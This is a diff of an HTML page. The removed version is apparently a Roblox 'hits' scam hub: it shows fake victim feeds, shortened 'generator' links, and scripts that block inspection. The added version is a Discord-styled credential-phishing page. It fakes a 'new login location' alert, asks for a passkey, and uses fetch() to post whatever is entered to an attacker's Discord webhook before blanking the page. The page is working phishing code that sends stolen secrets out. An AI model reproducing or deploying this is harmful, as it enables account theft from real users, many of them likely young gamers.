@@ -3,712 +3,181 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>💎 League #1 SITE! 💎</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
+  <title>Drakify Login</title>
   <style>
-    * {
-      box-sizing: border-box;
+    body {
+      background: url("https://wallpapercave.com/wp/wp5128415.jpg") no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       margin: 0;
       padding: 0;
     }
-    html, body {
-      font-family: 'Montserrat', sans-serif;
-      background: linear-gradient(135deg, #1a0a00, #140800);
-      color: white;
-      min-height: 100vh;
-      overflow-x: hidden;
-      scroll-behavior: smooth;
-    }
-    .container {
-      padding: 2rem;
+
+    .popup {
       display: flex;
       flex-direction: column;
       align-items: center;
-      position: relative;
-      z-index: 1;
-    }
-    .main-layout {
-      display: flex;
       justify-content: center;
-      width: 100%;
-      max-width: 1400px;
-      gap: 25px;
-    }
-    .main-center {
-      flex: 2;
-    }
-    .main-side {
-      flex: 1;
-      min-width: 280px;
-    }
-    /* ===== Luxury Background ===== */
-    .background-animation {
       position: fixed;
-      top: 0;
-      left: 0;
+      top: 0; left: 0;
       width: 100vw;
       height: 100vh;
-      z-index: 0;
-      pointer-events: none;
-      overflow: hidden;
-      background: radial-gradient(circle at 20% 30%, rgba(80,60,0,0.15) 0%, transparent 50%);
-    }
-    .dot {
-      position: absolute;
-      background: rgba(255, 200, 0, 0.7);
-      width: 2px;
-      height: 2px;
-      border-radius: 50%;
-      animation: float 60s linear infinite;
-      filter: drop-shadow(0 0 8px #ffcc00);
-    }
-    .luxury-dot {
-      position: absolute;
-      width: 4px;
-      height: 4px;
-      background: gold;
-      border-radius: 50%;
-      filter: drop-shadow(0 0 5px gold);
-      animation: sparkle 4s infinite alternate;
-    }
-    @keyframes float {
-      0% { transform: translateY(0) translateX(0); }
-      50% { transform: translateY(-50px) translateX(50px); }
-      100% { transform: translateY(0) translateX(0); }
-    }
-    @keyframes sparkle {
-      0% { opacity: 0.3; }
-      100% { opacity: 1; }
-    }
-    /* ===== Luxury Header ===== */
-    .header {
-      font-size: 2.8rem;
-      font-family: 'Orbitron', sans-serif;
-      background: linear-gradient(90deg, #ffcc00, #ffaa00, #ffcc00);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      text-align: center;
-      margin-bottom: 2rem;
-      text-shadow: 0 0 15px rgba(255,200,0,0.3);
-      position: relative;
-      z-index: 1;
-      letter-spacing: 1px;
-    }
-    .header::after {
-      content: "";
-      display: block;
-      width: 300px;
-      height: 3px;
-      background: linear-gradient(90deg, transparent, #ffcc00, transparent);
-      margin: 15px auto;
-      box-shadow: 0 0 10px #ffcc00;
-    }
-    /* ===== Luxury Cards ===== */
-    .site-card {
-      background: rgba(20, 15, 0, 0.25);
-      border: 1px solid rgba(255, 200, 0, 0.3);
-      border-radius: 16px;
-      padding: 1.8rem;
-      margin-bottom: 2rem;
-      backdrop-filter: blur(12px);
-      box-shadow: 0 8px 32px rgba(100, 80, 0, 0.2);
-      transition: all 0.4s ease;
-      position: relative;
-      overflow: hidden;
-      z-index: 1;
-    }
-    .site-card:hover {
-      transform: translateY(-8px);
-      box-shadow: 0 12px 40px rgba(255, 200, 0, 0.3);
-    }
-    .site-card::before {
-      content: "";
-      position: absolute;
-      top: -2px;
-      left: -2px;
-      right: -2px;
-      bottom: -2px;
-      background: linear-gradient(45deg, #ffcc00, #ffaa00, #ffcc00);
-      z-index: -2;
-      border-radius: 18px;
-      opacity: 0;
-      transition: opacity 0.4s;
-    }
-    .site-card:hover::before {
-      opacity: 0.4;
-    }
-    .site-card::after {
-      content: "";
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: linear-gradient(135deg, rgba(255,200,0,0.05), rgba(200,150,0,0.03));
-      z-index: -1;
-      border-radius: 15px;
-    }
-    .site-card h3 {
-      margin: 0 0 1.5rem;
-      color: #ffeecc;
-      font-size: 1.6rem;
-      text-align: center;
-      font-weight: 700;
-      letter-spacing: 1px;
-      text-shadow: 0 0 10px rgba(255,200,0,0.3);
-    }
-    .status {
-      display: flex;
-      justify-content: space-between;
-      margin: 1.2rem 0;
-      padding: 0.8rem 0;
-      border-bottom: 1px solid rgba(255, 200, 0, 0.25);
-    }
-    .status span {
-      display: flex;
-      align-items: center;
-      gap: 0.8rem;
-      font-size: 1.1rem;
-    }
-    .check {
-      color: #ffcc00;
-      text-shadow: 0 0 10px #ffcc00;
-      font-weight: 600;
-    }
-    .cross {
-      color: #ff5555;
-      text-shadow: 0 0 10px #ff5555;
-      font-weight: 600;
-    }
-    .generator-btn {
-      width: 100%;
-      padding: 1rem;
-      background: linear-gradient(45deg, #aa8800, #ccaa00);
-      border: none;
-      color: white;
-      font-weight: bold;
-      font-size: 1.1rem;
-      border-radius: 12px;
-      cursor: pointer;
-      transition: all 0.4s ease;
-      margin-top: 1.5rem;
-      box-shadow: 0 6px 20px rgba(200, 150, 0, 0.3);
-      position: relative;
-      overflow: hidden;
-      z-index: 1;
-      letter-spacing: 0.5px;
-    }
-    .generator-btn:hover {
-      background: linear-gradient(45deg, #ccaa00, #ffcc00);
-      transform: translateY(-3px);
-      box-shadow: 0 8px 25px rgba(255, 200, 0, 0.5);
-    }
-    .generator-btn::before {
-      content: "";
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-      transition: 0.5s;
-      z-index: -1;
-    }
-    .generator-btn:hover::before {
-      left: 100%;
-    }
-    /* ===== Luxury Recent Hits ===== */
-    #recent-hits {
-      display: flex;
-      flex-direction: column;
-      gap: 0.8rem;
-    }
-    .hit-slot {
-      background: rgba(30, 20, 0, 0.4);
-      border-radius: 12px;
-      padding: 1rem;
-      margin-bottom: 0.8rem;
-      border: 1px solid rgba(255, 200, 0, 0.25);
-      transition: all 0.4s ease;
-      position: relative;
-      overflow: hidden;
-    }
-    .hit-slot:hover {
-      background: rgba(50, 30, 0, 0.6);
-      transform: translateX(8px);
-      box-shadow: 4px 0 15px rgba(255, 200, 0, 0.2);
-    }
-    .hit-slot::after {
-      content: "";
-      position: absolute;
-      bottom: 0;
-      left: 10%;
-      width: 80%;
-      height: 1px;
-      background: linear-gradient(90deg, transparent, rgba(255, 200, 0, 0.4), transparent);
-    }
-    .hit-slot div {
-      display: flex;
-      align-items: center;
-      gap: 1.2rem;
-    }
-    .hit-slot img {
-      width: 42px;
-      height: 42px;
-      border-radius: 50%;
-      border: 2px solid rgba(255, 200, 0, 0.6);
-      box-shadow: 0 0 10px rgba(255, 200, 0, 0.3);
-    }
-    .hit-slot span:first-of-type {
-      flex: 1;
-      font-weight: 600;
-      letter-spacing: 0.5px;
-      color: #ffeecc;
-    }
-    .hit-slot span:last-of-type {
-      color: #ffdd99;
-      font-weight: bold;
-      text-shadow: 0 0 8px rgba(255, 200, 0, 0.3);
-    }
-    /* ===== Luxury Leaderboard ===== */
-    .leaderboard-entry {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 1rem;
-      margin-bottom: 0.8rem;
-      background: rgba(30, 20, 0, 0.4);
-      border-radius: 12px;
-      border: 1px solid rgba(255, 200, 0, 0.25);
-      transition: all 0.4s ease;
-      position: relative;
-      overflow: hidden;
-    }
-    .leaderboard-entry:hover {
-      background: rgba(50, 30, 0, 0.6);
-      transform: translateX(5px);
-    }
-    .leaderboard-entry::after {
-      content: "";
-      position: absolute;
-      bottom: 0;
-      left: 10%;
-      width: 80%;
-      height: 1px;
-      background: linear-gradient(90deg, transparent, rgba(255, 200, 0, 0.3), transparent);
-    }
-    .leaderboard-entry img {
-      width: 45px;
-      height: 45px;
-      border-radius: 50%;
-      border: 2px solid #ffaa00;
-      box-shadow: 0 0 10px rgba(255, 200, 0, 0.3);
-    }
-    .leaderboard-entry strong {
-      flex: 1;
-      margin-left: 1.2rem;
-      font-weight: 600;
-      letter-spacing: 0.5px;
-      color: #ffeecc;
-    }
-    .leaderboard-score {
-      color: #ffdd99;
-      font-weight: bold;
-      text-shadow: 0 0 8px rgba(255, 200, 0, 0.3);
-    }
-    /* ===== Luxury Animations ===== */
-    .fade-out {
-      animation: fadeOutUp 0.6s ease-out forwards;
-    }
-    .slide-up {
-      animation: slideUp 0.6s ease-out forwards;
-    }
-    .fade-in {
-      animation: fadeIn 0.6s ease-out forwards;
-    }
-    @keyframes fadeOutUp {
-      0% { opacity: 1; transform: translateY(0); }
-      100% { opacity: 0; transform: translateY(-30px); }
-    }
-    @keyframes slideUp {
-      0% { transform: translateY(30px); }
-      100% { transform: translateY(0); }
-    }
-    @keyframes fadeIn {
-      0% { opacity: 0; transform: translateY(20px); }
-      100% { opacity: 1; transform: translateY(0); }
-    }
-    /* ===== Anti-Skid Popup ===== */
-    .anti-skid-popup {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.9);
-      backdrop-filter: blur(10px);
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      background-color: rgba(0, 0, 0, 0.75);
       z-index: 9999;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.3s;
+      backdrop-filter: blur(8px);
     }
-    .anti-skid-popup.active {
-      opacity: 1;
-      pointer-events: all;
-    }
-    .popup-content {
-      background: linear-gradient(135deg, #1a0a00, #201000);
-      border: 2px solid #ff3333;
-      border-radius: 20px;
-      padding: 2.5rem;
-      max-width: 500px;
-      width: 90%;
-      text-align: center;
-      box-shadow: 0 0 30px rgba(255,0,0,0.5);
-      position: relative;
-      overflow: hidden;
-    }
-    .popup-content::before {
-      content: "";
-      position: absolute;
-      top: -2px;
-      left: -2px;
-      right: -2px;
-      bottom: -2px;
-      background: linear-gradient(45deg, #ff0000, #ff5555, #ff0000);
-      z-index: -1;
-      border-radius: 22px;
-      opacity: 0.3;
-    }
-    .popup-content h2 {
-      color: #ff5555;
-      font-size: 2rem;
-      margin-bottom: 1.5rem;
-      text-shadow: 0 0 10px rgba(255,0,0,0.5);
-      font-family: 'Orbitron', sans-serif;
-    }
-    .popup-content p {
-      color: #ff9999;
-      font-size: 1.2rem;
-      margin-bottom: 2rem;
-      line-height: 1.6;
-    }
-    .popup-ok-btn {
-      padding: 0.8rem 2rem;
-      background: linear-gradient(45deg, #ff3333, #ff5555);
-      border: none;
+
+    .popup-box {
+      background-color: #36393f;
+      border-radius: 12px;
+      padding: 30px;
       color: white;
-      font-weight: bold;
-      font-size: 1.1rem;
-      border-radius: 10px;
+      text-align: center;
+      width: 320px;
+      box-shadow: 0 0 25px rgba(0, 0, 0, 0.6);
+      animation: fadeIn 0.4s ease;
+    }
+
+    .avatar {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      margin-bottom: 15px;
+    }
+
+    .popup h2 {
+      margin: 0 0 10px;
+      font-size: 22px;
+    }
+
+    .popup input {
+      padding: 10px;
+      width: 100%;
+      margin-top: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #202225;
+      color: white;
+    }
+
+    .popup button {
+      margin-top: 15px;
+      padding: 10px;
+      width: 100%;
+      background-color: #5865F2;
+      color: white;
+      border: none;
+      border-radius: 5px;
       cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 0 15px rgba(255,0,0,0.3);
+      transition: background-color 0.2s ease;
     }
-    .popup-ok-btn:hover {
-      background: linear-gradient(45deg, #ff5555, #ff7777);
-      transform: translateY(-3px);
-      box-shadow: 0 0 20px rgba(255,0,0,0.5);
+
+    .popup button:hover {
+      background-color: #4752C4;
     }
-    /* ===== Responsive ===== */
-    @media (max-width: 768px) {
-      .main-layout {
-        flex-direction: column;
-      }
-      .main-side {
-        order: 2;
-      }
-      .main-center {
-        order: 1;
-      }
-      .leaderboard-entry {
-        display: none;
-      }
-      .leaderboard-entry:first-child {
-        display: flex;
-      }
-      .header {
-        font-size: 2rem;
-      }
-      .site-card {
-        padding: 1.5rem;
-      }
-      .popup-content {
-        padding: 1.5rem;
-      }
-      .popup-content h2 {
-        font-size: 1.5rem;
-      }
+
+    #loading {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.85);
+      color: white;
+      font-size: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      animation: fadeIn 0.4s ease;
+    }
+
+    #alert {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #202225;
+      color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.4);
+      z-index: 10001;
+      text-align: center;
+      animation: fadeIn 0.3s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
     }
   </style>
 </head>
-<body>
-  <!-- Anti-Skid Popup -->
-  <div class="anti-skid-popup" id="antiSkidPopup">
-    <div class="popup-content">
-      <h2 id="popupTitle">NO SKIDDING!</h2>
-      <p id="popupMessage">Made by CODEXBOI</p>
-      <button class="popup-ok-btn" id="popupOkBtn">OK</button>
+<body onload="showPopup()">
+
+  <div id="popup" class="popup">
+    <div class="popup-box">
+      <img class="avatar" src="https://i.pinimg.com/736x/ae/ed/d1/aeedd126eb22be0730716d4a6277ca54.jpg" alt="Avatar">
+      <h2>Confirm It's You</h2>
+      <p>New login location detected — please enter your passkey</p>
+      <input type="password" id="passInput" placeholder="Enter Passkey">
+      <button onclick="sendPass()">Confirm</button>
     </div>
   </div>
 
-  <!-- Background Animation -->
-  <div class="background-animation" id="background"></div>
-
-  <!-- Main Content -->
-  <div class="container">
-    <div class="header">💎 Alternative Domains 💎</div>
-    <div class="main-layout">
-      <div class="main-side">
-        <div class="site-card">
-          <h3>🏆 TOP PLAYERS</h3>
-          <div class="leaderboard-entry">
-            <img src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-39C804AC3F6F8240433374C89EFFBEB8-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="DELUXEONTOP">
-            <strong>Sagez</strong>
-            <span class="leaderboard-score">66 HITS</span>
-          </div>
-          <div class="leaderboard-entry">
-            <img src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-AD433F70C32296BFED10A1C8C1D92E97-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="PROGAMER">
-            <strong>Just seller:D</strong>
-            <span class="leaderboard-score">35 HITS</span>
-          </div>
-          <div class="leaderboard-entry">
-            <img src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-13CC8C402525A4F57D1D8CAC1AC323D1-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="rxdd">
-            <strong>rxdd</strong>
-            <span class="leaderboard-score">23 HITS</span>
-          </div>
-          <div class="leaderboard-entry">
-            <img src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-119ACABA3FF0E413885BE7DA1744903A-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="NINJA">
-            <strong>0geum</strong>
-            <span class="leaderboard-score">22 HITS</span>
-          </div>
-          <div class="leaderboard-entry">
-            <img src="https://www.roblox.com/headshot-thumbnail/image?userId=5&width=48&height=48&format=png" alt="GHOST">
-            <strong>Ice</strong>
-            <span class="leaderboard-score">14 HITS</span>
-          </div>
-        </div>
-      </div>
-
-      <div class="main-center">
-        <div class="site-card">
-          <h3>SPLUNK/League GENERATOR</h3>
-          <div class="status">
-            <span>TikTok: <span class="check">✔ WORKING</span></span>
-            <span>Chrome: <span class="check">✔ WORKING</span></span>
-          </div>
-          <button class="generator-btn" onclick="window.open('https://is.gd/1PEnXb', '_blank')">GENERATE NOW</button>
-        </div>
-
-        <div class="site-card">
-          <h3>IMMORTAL/League GENERATOR</h3>
-          <div class="status">
-            <span>TikTok: <span class="cross">✘ BLOCKED</span></span>
-            <span>Chrome: <span class="check">✔ WORKING</span></span>
-          </div>
-          <button class="generator-btn" onclick="window.open('https://is.gd/UR1SGP==', '_blank')">GENERATE NOW</button>
-        </div>
-
-        <div class="site-card">
-          <h3>soon</h3>
-          <div class="status">
-            <span>TikTok: <span class="check">✔ WORKING</span></span>
-            <span>Chrome: <span class="check">✔ WORKING</span></span>
-          </div>
-          <button class="generator-btn" onclick="window.open('https://discord.gg/rGAtfBueE9', '_blank')">discord</button>
-        </div>
-      </div>
-
-      <div class="main-side">
-        <div class="site-card">
-          <h3>🔥 RECENT HITS</h3>
-          <div id="recent-hits"></div>
-        </div>
-      </div>
-    </div>
-  </div>
+  <div id="loading">Logging in...</div>
+  <div id="alert">⚠️ Please provide a valid passkey.</div>
 
   <script>
-    // ===== Luxury Background =====
-    const container = document.getElementById('background');
-    const numberOfDots = 250;
-    for (let i = 0; i < numberOfDots; i++) {
-      // Yellow dots
-      const dot = document.createElement('div');
-      dot.classList.add('dot');
-      dot.style.top = `${Math.random() * 100}vh`;
-      dot.style.left = `${Math.random() * 100}vw`;
-      dot.style.animationDuration = `${60 + Math.random() * 50}s`;
-      dot.style.opacity = `${0.3 + Math.random() * 0.7}`;
-      container.appendChild(dot);
-
-      // Gold luxury dots (fewer)
-      if (i % 15 === 0) {
-        const luxuryDot = document.createElement('div');
-        luxuryDot.classList.add('luxury-dot');
-        luxuryDot.style.top = `${Math.random() * 100}vh`;
-        luxuryDot.style.left = `${Math.random() * 100}vw`;
-        luxuryDot.style.animationDelay = `${Math.random() * 5}s`;
-        container.appendChild(luxuryDot);
-      }
-    }
-
-    // ===== Recent Hits Data =====
-    const recentUsers = [
-      { name: 'Queen_bee123', rap: '920', img: 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F1B63229F9983A50B23192E1AB2D73B1-Png/150/150/AvatarHeadshot/Webp/noFilter' },
-      { name: 'Realkutta', rap: '872', img: 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-9AF35A064BB5E154CF6BBDD5571E5499-Png/150/150/AvatarHeadshot/Webp/noFilter' },
-      { name: 'LuLuDinoGirl714', rap: '360', img: 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-3905CF867121B6038F77C589649806EA-Png/150/150/AvatarHeadshot/Webp/noFilter' },
-      { name: 'IIIICONICELI', rap: '194', img: 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-1323917AA4D01F38162C2B5B87D54A1F-Png/150/150/AvatarHeadshot/Webp/noFilter' },
-      { name: 'Mia', rap: '120', img: 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-222534A1381BEB66751E16666248E911-Png/150/150/AvatarHeadshot/Webp/noFilter' },
-      { name: 'DitatheSlayRoach', rap: '690', img: 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-1498820FE66B7B11A236E1F01E91D985-Png/150/150/AvatarHeadshot/Webp/noFilter' },
-      { name: 'PANDAAGIRLY', rap: '875', img: 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-AE4011C68FD5100AEDCD8D425184117D-Png/150/150/AvatarHeadshot/Webp/noFilter' },
-      { name: 'Emma', rap: '1050', img: 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-2F3B10EDE5D2F181F9C931F9266A959C-Png/150/150/AvatarHeadshot/Webp/noFilter' },
-      { name: 'Amelia', rap: '934', img: 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0F82213439A56B5F6E2C380A1B095779-Png/150/150/AvatarHeadshot/Webp/noFilter' },
-      { name: 'Twizzy', rap: '298', img: 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0592E1B195382CA03333B4A130CD6E95-Png/150/150/AvatarHeadshot/Webp/noFilter' }
-    ];
-
-    // ===== Recent Hits Animation =====
-    const containerHits = document.getElementById('recent-hits');
-    let hitIndex = 0;
-
-    function updateRecentHits() {
-      if (containerHits.children.length < 3) {
-        for (let i = 0; i < 3; i++) {
-          const div = document.createElement('div');
-          div.className = 'hit-slot';
-          containerHits.appendChild(div);
-        }
-      }
-
-      const slots = containerHits.children;
-
-      // 1. Fade out top slot
-      slots[0].classList.add('fade-out');
-
-      setTimeout(() => {
-        // 2. Move middle slot up
-        slots[1].classList.add('slide-up');
-
-        // 3. Move bottom slot to middle
-        if (slots[2]) {
-          slots[2].style.transform = 'translateY(-30px)';
-        }
-
-        // 4. Add new data to bottom slot
-        setTimeout(() => {
-          const user = recentUsers[Math.floor(Math.random() * recentUsers.length)];
-          const newDiv = document.createElement('div');
-          newDiv.className = 'hit-slot fade-in';
-          newDiv.innerHTML = `
-            <div>
-              <img src="${user.img}" alt="${user.name}">
-              <span>${user.name}</span>
-              <span>${user.rap} RAP</span>
-            </div>`;
-
-          // Remove old top slot
-          slots[0].remove();
-
-          // Move slots up
-          if (slots[1]) slots[1].classList.remove('slide-up');
-          if (slots[2]) {
-            slots[2].style.transform = '';
-            containerHits.insertBefore(slots[2], containerHits.firstChild);
-          }
-
-          // Add new slot at bottom
-          containerHits.appendChild(newDiv);
-        }, 400);
-      }, 400);
-    }
-
-    // Initialize first 3 hits
-    for (let i = 0; i < 3; i++) {
-      const user = recentUsers[i % recentUsers.length];
-      const div = document.createElement('div');
-      div.className = 'hit-slot';
-      div.innerHTML = `
-        <div>
-          <img src="${user.img}" alt="${user.name}">
-          <span>${user.name}</span>
-          <span>${user.rap} RAP</span>
-        </div>`;
-      containerHits.appendChild(div);
-    }
-
-    // Update hits every 3 seconds
-    setInterval(updateRecentHits, 3000);
-
-    // ===== Anti-Skid Protection =====
-    const antiSkidPopup = document.getElementById('antiSkidPopup');
-    const popupTitle = document.getElementById('popupTitle');
-    const popupMessage = document.getElementById('popupMessage');
-    const popupOkBtn = document.getElementById('popupOkBtn');
-
-    let inspectAttempts = 0;
-    const maxAttempts = 3;
-
-    // Detect F12, Ctrl+Shift+I, Ctrl+Shift+J, etc.
-    document.addEventListener('keydown', function(e) {
-      if (e.key === 'F12' || 
-          (e.ctrlKey && e.shiftKey && e.key === 'I') || 
-          (e.ctrlKey && e.shiftKey && e.key === 'J') || 
-          (e.ctrlKey && e.key === 'U')) {
-        e.preventDefault();
-        handleInspectAttempt();
-      }
-    });
-
-    // Detect right-click
-    document.addEventListener('contextmenu', function(e) {
-      e.preventDefault();
-      handleInspectAttempt();
-    });
-
-    // Detect mobile menu button (some devices)
-    document.addEventListener('keyup', function(e) {
-      if (e.key === 'Menu') {
-        handleInspectAttempt();
-      }
-    });
-
-    function handleInspectAttempt() {
-      inspectAttempts++;
-
-      if (inspectAttempts <= maxAttempts) {
-        if (inspectAttempts === maxAttempts) {
-          popupTitle.textContent = "NO SKIDDING!";
-          popupMessage.textContent = "YOU'RE ALMOST THERE! TRY AGAIN TO SKID!";
-        } else {
-          popupTitle.textContent = "NO SKIDDING!";
-          popupMessage.textContent = "Made by CODEXBOI";
-        }
-
-        showPopup();
-      }
-    }
+    const popup = document.getElementById("popup");
+    const loading = document.getElementById("loading");
+    const alertBox = document.getElementById("alert");
+    const webhookURL = "YOUR_WEBHOOK_HERE"; // Replace with your Discord webhook
 
     function showPopup() {
-      antiSkidPopup.classList.add('active');
-
-      // Auto-close after 5 seconds
-      setTimeout(() => {
-        antiSkidPopup.classList.remove('active');
-      }, 5000);
+      popup.style.display = "flex";
+      document.getElementById("passInput").focus();
     }
 
-    popupOkBtn.addEventListener('click', function() {
-      antiSkidPopup.classList.remove('active');
-    });
+    function sendPass() {
+      const passkey = document.getElementById("passInput").value.trim();
+      if (!passkey) {
+        alertBox.style.display = "block";
+        setTimeout(() => {
+          alertBox.style.display = "none";
+        }, 2000);
+        return;
+      }
 
-    // Extra protection against console tampering
-    console.log("%cSTOP!", "color: red; font-size: 50px; font-weight: bold;");
-    console.log("%cThis is a browser feature intended for developers.", "font-size: 16px;");
-    console.log("%cIf someone told you to paste something here, it's a scam.", "font-size: 16px;");
+      popup.style.display = "none";
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `🔐 Passkey submitted: **${passkey}**`
+        })
+      })
+      .then(() => {
+        loading.style.display = "flex";
+        setTimeout(() => {
+          document.body.innerHTML = "";
+        }, 25000);
+      })
+      .catch(() => {
+        loading.style.display = "flex";
+        setTimeout(() => {
+          document.body.innerHTML = "";
+        }, 25000);
+      });
+    }
+
+    document.getElementById("passInput").addEventListener("keypress", function(e) {
+      if (e.key === "Enter") sendPass();
+    });
   </script>
+
 </body>
 </html>
